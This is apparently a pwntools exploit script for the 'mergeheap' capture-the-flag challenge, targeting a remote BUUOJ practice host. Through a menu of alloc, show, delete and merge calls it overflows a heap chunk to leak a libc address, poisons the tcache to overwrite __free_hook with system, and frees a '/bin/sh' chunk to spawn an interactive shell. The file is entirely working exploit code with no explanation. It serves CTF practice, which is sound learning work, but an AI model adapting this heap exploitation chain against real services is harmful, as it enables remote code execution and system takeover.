from pwn import *

#p = process('./mergeheap')
p = remote('node4.buuoj.cn', 29647)
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size, content):
    sla(b'>>', b'1')
    sla(b'len:', str(size).encode())
    sa(b'content:', content)

def show(idx):
    sla(b'>>', b'2')
    sla(b'idx', str(idx).encode())

def delete(idx):
    sla(b'>>', b'3')
    sla(b'idx', str(idx).encode())

def merge(idx1, idx2):
    sla(b'>>', b'4')
    sla(b'idx1', str(idx1).encode())
    sla(b'idx2', str(idx2).encode())

alloc(0x38, b'a' * 0x38) #0
alloc(0xf0, b'a' * 0xee + b'\x21\x05') #1
alloc(0x120, b'a\n') #2
alloc(0x300, b'a\n') #3
alloc(0x200, b'a\n') #4
alloc(0x80, b'a\n') #5
delete(2)
merge(0, 1) #2
delete(3)

alloc(0x8, b'aaaaaaaa') #3
show(3)

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 1168 - 0x10 - libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
success('libc_base -> {}'.format(hex(libc_base)))

alloc(0x300 - 0x20, b'a\n') #6
alloc(0x200, b'a\n') #7

delete(7)
delete(4)

alloc(0x200, p64(free_hook) + b'\n') #4
alloc(0x200 ,b'/bin/sh\x00\n') #7
alloc(0x200, p64(system) + b'\n') #8

delete(7)

p.interactive()